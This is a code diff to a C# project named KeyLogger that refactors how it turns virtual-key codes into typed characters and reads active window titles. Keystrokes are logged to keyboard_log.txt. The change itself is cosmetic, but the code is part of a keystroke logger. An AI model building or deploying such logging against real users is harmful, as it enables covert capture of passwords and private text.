@@ -18,6 +18,7 @@ namespace KeyLogger.Services
 		private static bool _numLock;
 		private static bool _scrollLock;
 		private const string _fileName = "keyboard_log.txt";
+		private const short maxChars = 256;
 
 		internal static IntPtr HookId { get; set; }
 		internal static IntPtr WindowHookId { get; set; }
@@ -76,11 +77,10 @@ namespace KeyLogger.Services
 
 		private static string GetActiveWindowTitle()
 		{
-			var nChars = 256;
-			var buff = new StringBuilder(nChars);
+			var buff = new StringBuilder(maxChars);
 			var handle = GetForegroundWindow();
 
-			if (GetWindowText(handle, buff, nChars) > 0)
+			if (GetWindowText(handle, buff, maxChars) > 0)
 			{
 				return buff.ToString();
 			}
@@ -92,17 +92,20 @@ namespace KeyLogger.Services
 			_capsLock = ((ushort)GetKeyState((int)Keys.CapsLock)) != 0;
 			_numLock = ((ushort)GetKeyState((int)Keys.NumLock)) != 0;
 			_scrollLock = ((ushort)GetKeyState((int)Keys.Scroll)) != 0;
-			_shift = (GetKeyState((int)Keys.ShiftKey)) != 0;
+			_shift = GetKeyState((int)Keys.ShiftKey) != 0;
 		}
 
 		private static string GetSymbol(uint vkCode)
 		{
-			var buf = new StringBuilder(256);
-			var keyboardState = new byte[256];
+			var buff = new StringBuilder(maxChars);
+			var keyboardState = new byte[maxChars];
 			ushort keyboard = GetKeyboardLayout(
 					  GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
-			ToUnicodeEx(vkCode, 0, keyboardState, buf, 256, 0, (IntPtr)keyboard);
-			string symbol = buf.ToString().Equals("\r") ? Environment.NewLine : buf.ToString();
+			ToUnicodeEx(vkCode, 0, keyboardState, buff, maxChars, 0, (IntPtr)keyboard);
+			var buffSymbol = buff.ToString();
+			string symbol = buffSymbol.Equals("\r") 
+				? Environment.NewLine 
+				: buffSymbol;
 			if (_capsLock ^ _shift)
 				symbol = symbol.ToUpperInvariant();
 			return symbol;
